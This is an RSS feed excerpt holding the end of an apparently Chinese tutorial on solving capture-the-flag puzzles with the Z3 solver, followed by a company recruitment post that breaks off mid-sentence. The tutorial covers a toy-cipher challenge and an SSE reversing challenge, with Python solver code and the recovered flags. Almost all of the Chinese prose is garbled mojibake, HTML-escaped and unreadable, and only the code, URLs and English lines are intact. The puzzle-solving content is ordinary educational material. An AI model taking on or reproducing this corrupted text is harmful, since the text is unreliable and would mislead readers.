[y = 0, x = 7] &lt;/code&gt;&lt;p&gt;å¯ä»¥çœ‹å‡ºï¼ŒZ3 æ‰¾åˆ°äº† y=0ï¼Œx=7 è¿™ç»„è§£ã€‚ç»†å¿ƒçš„å°ä¼™ä¼´ä¼šå‘ç°ï¼Œx=5,y=1 ä¹Ÿç¬¦åˆæ¡ä»¶ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰ä½“ç°ï¼ŸåŸå› åœ¨äº Z3 åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œåªå¯»æ‰¾æ»¡è¶³æ‰€æœ‰æ¡ä»¶çš„ä¸€ç»„è§£ï¼Œè€Œä¸æ˜¯æ‰¾å‡ºæ‰€æœ‰è§£ã€‚&lt;/p&gt;&lt;p&gt;å¥½äº†ï¼Œç»è¿‡ä¸Šé¢çš„ç®€å•ä»‹ç»ç›¸ä¿¡å¤§å®¶éƒ½å¯¹ Z3 æœ‰ä¸€ä¸ªåŸºæœ¬çš„è®¤è¯†ï¼Œä¸‹é¢çœ‹çœ‹åœ¨ CTF å®é™…åº”ç”¨ã€‚&lt;/p&gt;&lt;h2&gt;Z3 å®æˆ˜æ ·é¢˜ä¸€ï¼šDEFCAMP 2017 Misc é¢˜ forgot my key&lt;/h2&gt;&lt;p&gt;é¢˜ç›®å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;p&gt;I forgot my flag &amp;amp; key. Help me recover them.&lt;/p&gt;&lt;p&gt;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function my_encrypt($flag, $key) {
  $key = md5($key);
  $message = $flag . &quot;|&quot; . $key;

  $encrypted = chr(rand(0, 126));
  for($i=0;$i&amp;lt;strlen($message);$i++) {
    $encrypted .= chr((ord($message[$i]) + ord($key[$i % strlen($key)]) + ord($encrypted[$i])) % 126);
  }
  $hexstr = unpack(&#39;h*&#39;, $encrypted);
  return array_shift($hexstr);
}
&lt;/code&gt;&lt;p&gt;è¿™é¢˜ç»™äº†ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œè¦æ±‚è¿˜åŸ flag å’Œ keyã€‚è§‚å¯Ÿå¯ä»¥å‘ç°ï¼ŒåŠ å¯†ä¸²æ¯ä¸€ä½éƒ½ä¸æ˜æ–‡ã€keyã€å’ŒåŠ å¯†ä¸²çš„å‰ä¸€ä½ç›¸å…³ã€‚ä½†æ˜¯ç”±äºç¬¬ä¸€ä½æ˜¯éšæœºå‡ºæ¥çš„ï¼Œæ‰€ä»¥å¾ˆéš¾ä»å¼€å¤´é€’æ¨å‡ºæ¥ã€‚ä½†æ˜¯ç»†å¿ƒè§‚å¯Ÿ message çš„æ„æˆåˆå¯ä»¥å‘ç°ï¼Œåé¢ 32 ä½æ˜¯ key çš„ md5 ä¸²ï¼Œå€’æ•°ç¬¬ 33 ä½åˆæ˜¯å·²çŸ¥ï¼Œå› æ­¤ä»è¿™é‡Œå°±å¯ä»¥æ‰“å¼€çªç ´å£ã€‚æ•´ç†æ€è·¯å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ç¬¬ä¸€æ­¥ï¼šé€šè¿‡å€’æ•°ç¬¬ 33 ä½æ˜æ–‡å·²çŸ¥ï¼Œä¸”å¯†æ–‡å·²çŸ¥ï¼Œå› æ­¤å¯ä»¥æ±‚å¾—æŸä¸€ä½ md5($key) çš„å€¼ã€‚&lt;/li&gt;&lt;li&gt;ç¬¬äºŒæ­¥ï¼šæ ¹æ®ä¸Šä¸€æ­¥æ¨å‡ºæ¥çš„å€¼ï¼Œåˆå¯ä»¥è¿›ä¸€æ­¥æ¨å¦ä¸€ä½ message çš„å€¼ã€‚å¦‚æ­¤å¾€å¤ä¸‹å»ï¼Œæœ€ç»ˆåº”è¯¥èƒ½æ‰¾åˆ°æ‰€æœ‰çš„å€¼ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;æ€è·¯æ˜¯æœ‰äº†ï¼Œç„¶è€Œå†™èµ·æ¥æœªå¿…ç®€å•ï¼Œå› ä¸ºäººçš„æ€ç»´éƒ½æ˜¯æ­£å‘çš„ï¼Œé€†å‘æ±‚è§£ç‰¹åˆ«æ˜¯è¿˜è¦å†™å‡ºå®Œæ•´æ±‚è§£ä»£ç æ€»æ˜¯éº»çƒ¦çš„ã€‚&lt;/p&gt;&lt;p&gt;äºæ˜¯æˆ‘ä»¬è€ƒè™‘æ˜¯å¦å¯ä»¥ä½¿ç”¨ Z3 æ¥æ±‚è§£ã€‚é¦–å…ˆé¢˜ç›®è‚¯å®šä¿è¯äº†ç­”æ¡ˆçš„å”¯ä¸€æ€§ï¼Œå› æ­¤ Z3 æ±‚è§£æˆåŠŸå°±ä¼šå¾—åˆ° flag æ— ç–‘ã€‚å…¶æ¬¡ï¼Œæˆ‘ä»¬æ ¹æ®é¢˜ç›®çš„å˜æ¢æ–¹å¼ï¼Œç»™ Z3 æ‰€æœ‰çš„æ­£æ¨å…³ç³»å¼ï¼ŒæŠŠé€†æ¨çš„é€»è¾‘è®© Z3 é€šè¿‡çº¦æŸæ±‚è§£æ¥å®Œæˆï¼Œç”±äºé€†æ¨å¯ä»¥ä¸€æ­¥æ­¥è¿›è¡Œï¼Œå› æ­¤ä¹Ÿä¸ä¼šå¯¼è‡´ Z3 å¤æ‚åº¦çˆ†ç‚¸æ±‚è§£ä¸å‡ºæ¥ã€‚å¦‚æ­¤åˆ†æåº”è¯¥ Z3 ä¸€æŠŠæ¢­é—®é¢˜ä¸å¤§ã€‚&lt;/p&gt;&lt;p&gt;ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/usr/bin/env python3

from z3 import *
import binascii

s = &#39;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&#39;

encrypted = []
for i in range(0, len(s), 2):
    encrypted.append(binascii.unhexlify(s[i+1] + s[i])[0])

print(&#39;message len:&#39;, len(encrypted)-1)
print(encrypted)
# å£°æ˜å˜é‡ï¼Œencrypted æ˜¯å·²çŸ¥ï¼Œå› æ­¤ IntVal å³å¯
encrypted = [IntVal(i) for i in encrypted]
message = [Int(&#39;flag%d&#39; % i) for i in range(len(encrypted)-1)]
# åˆ›å»ºä¸€ä¸ªæ±‚è§£å™¨ï¼Œæ±‚è§£å…¨é å®ƒ
solver = Solver()

ml = len(encrypted) - 1

# æ·»åŠ æ˜æ–‡å­—ç¬¦çš„çº¦æŸæ¡ä»¶
for i in range(ml):
    if i == ml - 33:
        solver.add(message[i] == ord(&#39;|&#39;))
    else:
        # è‚¯å®šæ˜¯å¯è§å­—ç¬¦ï¼Œå› æ­¤é™å®šèŒƒå›´å¦‚ä¸‹
        solver.add(message[i] &amp;lt; 127)
        solver.add(message[i] &amp;gt;= 32)
# æ·»åŠ æ˜æ–‡å’Œå¯†æ–‡å¯¹ç…§å…³ç³»çš„çº¦æŸæ¡ä»¶
for i in range(ml):
    solver.add(encrypted[i+1] == (message[i] + message[ml-32+i%32] + encrypted[i]) % 126)

if solver.check() == sat:
    m = solver.model()
    s = []
    for i in range(ml):
        s.append(m[message[i]].as_long())
    print(bytes(s))
else:
    print(&#39;unsat&#39;) &lt;/code&gt;&lt;p&gt;è¿è¡Œæ±‚è§£ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ time python solve.py 
message len: 103
b&#39;DCTF{0d940de38493d96dc6255cbb2c2ac7a2db1a7792c74859e95215caa6b57c69b2}|6941f4cac9b7784fdd77e11b51cd0d64&#39;

real	0m7.277s
user	0m7.260s
sys	0m0.010s &lt;/code&gt;&lt;p&gt;åœ¨æˆ‘çš„ Mac ä¸Šæ€»å…±è€—æ—¶ 7sã€‚ä»è¿™ä¸ª &lt;a href=&quot;http://solve.py/&quot;&gt;solve.py&lt;/a&gt; å¯ä»¥çœ‹å‡ºï¼Œç”±äºä½¿ç”¨äº† Z3ï¼Œæ±‚è§£æ•´ä¸ªé¢˜ç›®æ‰€éœ€è¦åšçš„äº‹æƒ…åŸºæœ¬å°±æ˜¯ç…§ç€åŸæ¥çš„é€»è¾‘ç…§æŠ„ç¿»è¯‘ä¸€éï¼Œå†æ·»åŠ å…¶ä»–ç»†èŠ‚ï¼ˆå¦‚å¯è§å­—ç¬¦èŒƒå›´åœ¨32åˆ°127ä¹‹é—´ï¼‰ï¼Œç„¶åæ±‚è§£ï¼Œå°±å¤§åŠŸå‘Šæˆäº†ï¼&lt;/p&gt;&lt;h2&gt;z3 å®æˆ˜æ ·é¢˜äºŒï¼šCSAW 2017 é€†å‘é¢˜ realism&lt;/h2&gt;&lt;p&gt;å‰é¢æ˜¯ä¸€é“ç®€å•çš„ misc/crypto é¢˜ç›®ï¼Œè¿™é‡Œå†å±•ç¤º Z3 åœ¨ä¸€é“é€†å‘é¢˜çš„åº”ç”¨ã€‚ realism æ˜¯ä¸€ä¸ªä¸»è¦é’ˆå¯¹ x86 &lt;a href=&quot;https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions&quot;&gt;SSE æŒ‡ä»¤&lt;/a&gt; çš„é€†å‘é¢˜ç›®ã€‚é¢˜ç›®å¯ä»¥ä» &lt;a href=&quot;https://github.com/youben11/CSAW_2017_quals_rev400&quot;&gt;https://github.com/youben11/CSAW_2017_quals_rev400&lt;/a&gt; è·å–ã€‚&lt;/p&gt;&lt;p&gt;é¢˜ç›®çš„ä¸»è¦é€»è¾‘å…¶å®å¹¶ä¸é•¿ï¼Œä½†æ˜¯ç”±äºåº”ç”¨äº† SSE æŒ‡ä»¤ï¼Œä¸”åŒæ ·æ˜¯ä¸€ç•ªå¾ªç¯é€»è¾‘è¿ç®—ä¹‹åï¼Œè¦æ±‚è¿ç®—ç»“æœä¸æŸä¸ªé¢„è®¾å€¼ç›¸ç­‰ï¼Œé€†å‘èµ·æ¥æœ‰ä¸€å®šå¤æ‚åº¦ã€‚å…³é”®é€»è¾‘å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0b294784dcae9d6b0bcee51759487f3c_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;2032&quot; data-rawheight=&quot;927&quot;&gt;&lt;p&gt;æŠŠé€»è¾‘æ•´ç†æˆä¼ªä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;xmm5 = results[0]

for i in range(8, 0, -1):
    xmm2 = andps(flag, bytes(masks[i:i+8]))
    xmm5 = psadbw(xmm5, xmm2)
    assert xmm5 == results[9-i] &lt;/code&gt;&lt;p&gt;åŒæ ·çš„ï¼Œå¦‚æœè¦æ ¹æ®ç»“æœé€†æ¨ï¼Œé¦–å…ˆéœ€è¦ç†è§£æ¸…æ¥šæ¯ä¸€ä¸ªæŒ‡ä»¤çš„ç²¾ç¡®å«ä¹‰ï¼Œç„¶åéœ€è¦åšå¤§é‡çš„é€†æ¨å·¥ä½œã€‚å› æ­¤è€ƒè™‘æ˜¯å¦å¯ä»¥ç”¨ Z3 ä»æ­£å‘æ€ç»´æ¥è§£å†³è¿™ç±»é—®é¢˜ã€‚&lt;/p&gt;&lt;p&gt;è¿™é‡Œçš„éš¾ç‚¹åœ¨äºè¦å‡†ç¡®æ¨¡æ‹Ÿ andps å’Œ psadbw ä¸¤ä¸ªæŒ‡ä»¤çš„è¡Œä¸ºã€‚æ­¤å¤–ï¼Œéœ€è¦é€‰æ‹©æ­£ç¡®çš„ BitVector å¤§å°ã€‚å› ä¸º 8 ä½ä¼šå¯¼è‡´ psadbw åŠ æ³•æº¢å‡ºå¾—åˆ°é”™è¯¯çš„å€¼ï¼Œå› æ­¤è¿™é‡Œç»Ÿä¸€ä½¿ç”¨ 16 ä½ã€‚&lt;/p&gt;&lt;p&gt;ç¨‹åºå¦‚ä¸‹ï¼š &lt;a href=&quot;https://gist.github.com/zTrix/036d904e85946fa273067f184210a6de&quot;&gt;https://gist.github.com/zTrix/036d904e85946fa273067f184210a6de&lt;/a&gt;&lt;/p&gt;&lt;p&gt;è¿è¡Œæˆ‘ä»¬çš„ç¨‹åºï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ time python3 solve.py 
b&#39;flag{4r3alz_m0d3_y0}&#39;

real	0m0.788s
user	0m0.790s
sys	0m0.000s &lt;/code&gt;&lt;p&gt;ä»…éœ€ 0.8s å³å¯è§£å‡ºç»“æœã€‚&lt;/p&gt;&lt;h2&gt;æ€»ç»“&lt;/h2&gt;&lt;p&gt;åˆç†ä½¿ç”¨ Z3 å¯ä»¥åœ¨è®¸å¤šåœºæ™¯ä¸‹æ ¹æ®çº¦æŸè‡ªåŠ¨å¸®åŠ©æˆ‘ä»¬æ±‚è§£ï¼Œåªéœ€è¦æ ¹æ®æ­£å‘æ€è·¯ä½¿ç”¨ Z3 è¡¨è¾¾åŸæœ‰é€»è¾‘å³å¯ï¼Œå¤§å¤§å‡å°‘æˆ‘ä»¬åˆ†æå’Œé€†æ¨çš„æ—¶é—´ã€‚å½“ç„¶ï¼ŒZ3 çš„åŠŸèƒ½è¿œä¸æ­¢è¿™äº›ï¼Œè¿™é‡Œåªæ˜¯ä»‹ç»äº†æœ€ç®€å•çš„å…¥é—¨åº”ç”¨ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥é€šè¿‡é˜…è¯»æ–‡æ¡£èµ„æ–™è¿›ä¸€æ­¥äº†è§£ã€‚&lt;/p&gt;&lt;h2&gt;å‚è€ƒèµ„æ–™&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://rise4fun.com/z3&quot;&gt;https://rise4fun.com/z3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/Z3Prover/z3/wiki/Slides&quot;&gt;https://github.com/Z3Prover/z3/wiki/Slides&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://z3prover.github.io/api/html/index.html&quot;&gt;http://z3prover.github.io/api/html/index.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://research.microsoft.com/en-us/um/redmond/projects/z3/z3.pdf&quot;&gt;http://research.microsoft.com/en-us/um/redmond/projects/z3/z3.pdf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://rise4fun.com/z3/tutorialcontent/guide&quot;&gt;Z3 - Guide&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(é•¿äº­æŠ€æœ¯ä¸“æ åŸåˆ›æ–‡ç« ï¼Œè½¬è½½è¯·æ³¨æ˜æ¥æº)&lt;/p&gt;</description>
<author>æœ±æ–‡é›·</author>
<guid isPermaLink="false">2017-10-29-30548907</guid>
<pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>å¥½èƒ†ä½ å°±æ¥ï¼é•¿äº­ç§‘æŠ€CROSSè®¡åˆ’ï¼šè·¨ä¸“ä¸šæ‹›è˜è®¡ç®—æœºäººæ‰</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-27-30515472.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;å¥½èƒ†ä½ å°±æ¥ï¼é•¿äº­ç§‘æŠ€CROSSè®¡åˆ’ï¼šè·¨ä¸“ä¸šæ‹›è˜è®¡ç®—æœºäººæ‰&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30515472&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-550fa0c48fdc0b4ab5d1281c4cc098fd_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;æˆ‘å¤§å­¦çš„æ—¶å€™å­¦äº†ä¸€ä»½&lt;b&gt;ç‰¹åˆ«ç‰›é€¼ã€é«˜å¤§ä¸Š&lt;/b&gt;çš„ä¸“ä¸šâ€”â€”ç”Ÿç‰©ç§‘å­¦ã€‚&lt;br&gt;è‡³äºä¸ºå•¥æˆ‘å­¦äº†è¿™ä¸ªä¸“ä¸šï¼Œä¸çŸ¥é“æ˜¯å“ªä¸ªç¥äººåœ¨æˆ‘æŠ¥å¿—æ„¿ä¹‹å‰ï¼Œå¤©å¤©å¹æ§&lt;b&gt;21ä¸–çºªæ˜¯ç”Ÿç‰©å­¦çš„å¤©ä¸‹&lt;/b&gt;ï¼&lt;br&gt;å½“æ—¶ç ”ç©¶äº†ä¸‰ä¸ªä¸“ä¸šï¼šç”Ÿç‰©å·¥ç¨‹ã€ç”Ÿç‰©æŠ€æœ¯ã€ç”Ÿç‰©ç§‘å­¦ï¼Œ&lt;b&gt;åªæœ‰è¿™ä¸ªç”Ÿç‰©ç§‘å­¦å¬èµ·æ¥æ˜¯æœ€ä¸ºç‰›é€¼&lt;/b&gt;çš„ã€‚&lt;br&gt;ç°åœ¨çœ‹èµ·æ¥ä¾ç„¶ç‰›é€¼ï¼Œæ¯•ä¸šä¹‹åå·¥ä½œä¹Ÿç¡®å®éš¾æ‰¾ã€‚&lt;br&gt;å…¶å®é™¤äº†ç­é‡Œä¸€åŠæ·±é€ çš„ï¼Œå…¶ä»–çš„äººåªæœ‰ä¸€ä¸ªä»äº‹äº†ç”Ÿç‰©è¡Œä¸šã€‚&lt;br&gt;æœ€ä¸ºè›‹ç–¼çš„æ˜¯ï¼Œå¥½å‡ ä¸ªå‡†å¤‡è€ƒå…¬åŠ¡å‘˜å´æ­¢æ­¥äºä¸“ä¸šé™åˆ¶ï¼Œæˆ‘ä»¬è¿™ä¸ªä¸“ä¸šè€ƒå…¬åŠ¡å‘˜éƒ½å—é™ï¼&lt;br&gt;é‚£ä½è¯´21ä¸–çºªæ˜¯ç”Ÿç‰©å­¦çš„ç¥äººåŒå¿—ï¼Œç°åœ¨æˆ‘è¦æ¥è·Ÿä½ èŠä¸€ä¸‹äººç”ŸèŠä¸€ä¸‹ç†æƒ³ã€‚&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;æˆ‘æ˜¯æ­£åœ¨æ‰¾å·¥ä½œçš„åº”å±Šå¸ˆèŒƒç”Ÿã€‚&lt;br&gt;å½“åˆé€‰äº†æœä»è°ƒå‰‚ä¸“ä¸šï¼Œæ•™è‚²æŠ€æœ¯ï¼Œå¼€å§‹ä¸€å¹´éƒ½ä¸çŸ¥é“å¹²å˜›çš„ï¼Œå¤§æ¦‚å°±æ˜¯ä¸­å­¦ä¿¡æ¯æŠ€æœ¯è€å¸ˆã€‚&lt;br&gt;å½“æ—¶è§‰å¾—å½“ä¸ªå‰¯ç§‘è€å¸ˆä¸é”™å•Šï¼&lt;br&gt;çœŸæ­£æ‰¾å·¥ä½œäº†æ‰å‘ç°ï¼Œå¸‚åœºéœ€æ±‚å¤ªå°‘ï¼ï¼&lt;br&gt;&lt;b&gt;æ²¡å‡ ä¸ªå­¦æ ¡ç¼ºä¿¡æ¯æŠ€æœ¯è€å¸ˆçš„ï¼ï¼ï¼&lt;/b&gt;&lt;br&gt;è¯­æ–‡æ•°å­¦çš„ä¸€æ‹›å°±æ˜¯å‡ åä¸ªï¼Œä¿¡æ¯æŠ€æœ¯ä¸€ä¸¤ä¸ªæˆ–è€…å‹æ ¹ä¸è¦ï¼Œä¸å½“è€å¸ˆåˆä¸çŸ¥é“è¿˜èƒ½å¹²å˜›ï¼Ÿ&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;æœ¬ç§‘ç”Ÿç‰©ï¼Œå­¦éœ¸ï¼Œ&lt;b&gt;æˆç»©top 1ï¼…&lt;/b&gt;ï¼Œ&lt;br&gt;ç„¶åï¼Œå¤§å››æ²¡æœ‰æ‰¾åˆ°å·¥ä½œâ€¦â€¦&lt;br&gt;æ€’è€Œè€ƒç ”ï¼Œ&lt;b&gt;è·¨ä¸“ä¸šï¼ŒæŒ‘æˆ˜CS&lt;/b&gt;ï¼ˆè®¡ç®—æœºï¼‰&lt;br&gt;çœŸæ˜¯æ¯”é«˜ä¸‰è¿˜è¾›è‹¦ï¼Œé«˜ä¸‰æ—¶æ— çŸ¥è€…æ— ç•ï¼Œæ²¡ä»€ä¹ˆå‹åŠ›ã€‚&lt;br&gt;è™½ç„¶ä¹‹å‰ä¸€ç›´åŠªåŠ›ï¼Œä½†ç¨³ç¨³å¦¥å¦¥ç”Ÿç‰©ä¸CSï¼Œé£é©¬ç‰›ä¸ç›¸åŠå•Šã€‚&lt;br&gt;&lt;b&gt;è€ƒç ”åŠªåŠ›æµè¿‡çš„æ±—éƒ½æ˜¯å½“å¹´é€‰ä¸“ä¸šæ—¶è„‘å­è¿›çš„æ°´å•Š~&lt;/b&gt;&lt;br&gt;éƒ½è¯´è½¬è¡Œæ¯ä¸‰å¹´ï¼Œè¯šç„¶ï¼Œæˆ‘ä¸‰å¹´çš„ç”Ÿç‰©å­¦ç§¯ç´¯æ¯äºä¸€æ—¦ã€‚&lt;br&gt;ç„¶ï¼Œä¸è½¬ï¼Œæ¯æˆ‘ä¸€ç”Ÿï¼&lt;br&gt;ä¸è¿‡ï¼Œâ€œ21ä¸–çºªæ˜¯ç”Ÿç‰©çš„ä¸–çºªâ€ï¼Œç°åœ¨æ¯•ç«Ÿåªæ˜¯ä¸–çºªä¹‹åˆï¼Œä»¥åçš„äº‹è°åˆèƒ½é¢„æ–™ã€‚&lt;br&gt;ä¸è¿‡ï¼Œä¸ä¼šåæ‚”ã€‚æˆ‘çˆ±CSï¼ŒJUST DO IT!&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;è¿™äº›æ¡ˆä¾‹ï¼Œæ˜¯ä¸æ˜¯çœ‹ç€æœ‰äº›çœ¼ç†Ÿï¼Ÿ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;è¯´çš„å°±æ˜¯ä½ å¯¹ä¸å¯¹ï¼Ÿ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;ï¼ˆå¤‡æ³¨ï¼šä»¥ä¸Šå¹¶ä¸æ˜¯åæ§½ä»»ä½•ä¸“ä¸šä¸å¥½ï¼Œè€Œæ˜¯éƒ¨åˆ†ä¸“ä¸šç¡®å®å­˜åœ¨å°±ä¸šéš¾çš„é—®é¢˜ï¼Œè¯·å‹¿åæ§½ï¼‰&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å½±å½±ç»°ç»°ä¸­ï¼Œæˆ‘ä»¬æå‡ºä¸€ä¸ªå¤§èƒ†çš„æƒ³æ³•ï¼&lt;/p&gt;&lt;p&gt;&lt;b&gt;ä¸ï¼é™ï¼ä¸“ï¼ä¸šï¼&lt;/b&gt;&lt;/p&gt;&lt;p&gt;é†‰å¿ƒCSï¼Œçˆ±é’»ç ”ï¼Œæ‡‚æŠ€æœ¯ï¼Œäº«å—æˆå°±çš„ä½ ä»¬ï¼&lt;/p&gt;&lt;p&gt;&lt;b&gt;æœ‰èƒ†é‡ï¼Œæ¥é•¿äº­è¯•è¯•å§ï¼&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;ä¸æ˜¯æ€‚æ¿æ”¾å¼ƒå…¶ä»–ä¸“ä¸šï¼Œè€Œæ˜¯å½“ä½ å¿ƒä¸­æœ‰è¿™ä¸ªå£°éŸ³æ—¶ï¼Œå¤šç»™ä½ ä¸€ä¸ªé€‰æ‹©ï¼&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;CROSSè®¡åˆ’&lt;/b&gt;ï¼Œæ˜¯é•¿äº­ç§‘æŠ€ä¸ºå‘æ˜åœ¨è®¡ç®—æœºé¢†åŸŸä¸­æ‹¥æœ‰ç‹¬åˆ°è§è§£ä¸ç ”ç©¶çš„&lt;b&gt;éè®¡ç®—æœºä¸“ä¸šäººæ‰&lt;/b&gt;è€Œå†³å®šæ¯å¹´ä¿ç•™çš„æ ¡æ‹›è®¡åˆ’ï¼æ¥å¤´å£å·ï¼š &lt;b&gt;å¥½èƒ†ä½ å°±æ¥ï¼&lt;/b&gt;&lt;/p&gt;&lt;p&gt;ä¸ç®¡ä½ å­¦ä»€ä¹ˆä¸“ä¸šï¼Œå»ºç­‘ã€åœŸæœ¨ã€æ•°å­¦ç”šè‡³æ˜¯ä¸è®¡ç®—æœºæ¯«ä¸ç›¸å…³çš„æ–‡ç§‘ç”Ÿï¼Œåªè¦ä½ å¯¹è®¡ç®—æœºé¢†åŸŸæ‹¥æœ‰æµ“åšçš„å…´è¶£ï¼Œä¸”åœ¨ä¸šä½™æ—¶é—´ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;èŠ±äº†è¶³å¤Ÿçš„ç²¾åŠ›å»é’»ç ”ï¼Œ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;æœ‰æ‰å®çš„æ•°ç†åŸºç¡€ï¼Œ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;æœ‰ç‹¬ç«‹çš„æ€è€ƒå’Œç ”ç©¶æ€åº¦&lt;/b&gt;ï¼Œ&lt;/p&gt;&lt;p&gt;&lt;b&gt;æˆ‘ä»¬ç»Ÿç»Ÿæ¬¢è¿ï¼&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å…¶å®ï¼Œæˆ‘ä»¬ä¹Ÿ&lt;b&gt;æ€•&lt;/b&gt;ï¼&lt;/p&gt;&lt;p&gt;&lt;b&gt;æ€•&lt;/b&gt;è¿™ä¸ªæ´»åŠ¨æ²¡æœ‰é‚£ä¹ˆå¤šäººå“åº”ï¼Œ&lt;/p&gt;&lt;p&gt;&lt;b&gt;æ€•&lt;/b&gt;ä½ ä»¬å®³æ€•è‡ªå·±æŠ€æœ¯ä¸è¡Œï¼Œ&lt;/p&gt;&lt;p&gt;&lt;b&gt;æ€•&lt;/b&gt;æœ‰äººè§‰å¾—é•¿äº­è¿™ä¸ªæè®®å¤ªç†æƒ³å›½äº†ï¼&lt;/p&gt;&lt;p&gt;Whileï¼Œæˆ‘ä»¬é€‰æ‹©ç«™äº†å‡ºæ¥ï¼Œæ¯•ç«Ÿï¼Œ&lt;/p&gt;&lt;p&gt;&lt;b&gt;æ”¾èƒ†è¿ˆå‡ºç¬¬ä¸€æ­¥ï¼Œæ‰æœ‰å¯èƒ½å°†ç†æƒ³å˜æˆç°å®ï¼&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ‰€ä»¥ï¼Œé‚€è¯·æ‚¨ï¼Œä½ ï¼Œæï¼Œ&lt;b&gt;å¥½èƒ†ä½ å°±æ¥&lt;/b&gt;ï¼&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;ä¸æ˜¯è®¡ç®—æœºä¸“ä¸šâ‰ ä¸æ˜¯è®¡ç®—æœºäººæ‰&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å½“ä½ å¿ƒä¸­æœ‰è¿™ä¸ªå£°éŸ³æ—¶ï¼Œå¤šç»™ä½ ä¸€ä¸ªé€‰æ‹©ã€‚&lt;/p&gt;&lt;p&gt;å¤§èƒ†åœ°è¿ˆå‡ºè¿™ä¸€æ­¥ï¼Œåšè‡ªå·±çœŸæ­£æƒ³åšçš„äº‹æƒ…ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;åœ¨è¿™é‡Œï¼Œä½ å¯ä»¥è·ŸéšæŠ€æœ¯å¤§ç‰›å…‰é€Ÿèµ·æ­¥ï¼Œè¿…é€Ÿæ‰“ä¸‹æ‰å®çš„è®¡ç®—æœºåŠŸåº•ã€‚&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;åœ¨è¿™é‡Œï¼Œä½ å¯ä»¥å‚ä¸å„ç§è§„èŒƒçš„å·¥ç¨‹é¡¹ç›®ï¼Œå¿«é€Ÿç§¯ç´¯ä¸°å¯Œçš„å·¥ç¨‹ç»éªŒã€‚&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;åœ¨è¿™é‡Œï¼Œä½ è¿˜å¯ä»¥æ¥è§¦æœ€æ–°æœ€é…·çš„é»‘å®¢æŠ€æœ¯ï¼Œè§è¯å„ç§é­”æœ¯èˆ¬é¢ è¦†æƒ³è±¡çš„ç¥å¥‡ã€‚&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;è€Œä»¥ä¸Šé€šé€šä¸æ˜¯å¹ç‰›ï¼Œå› 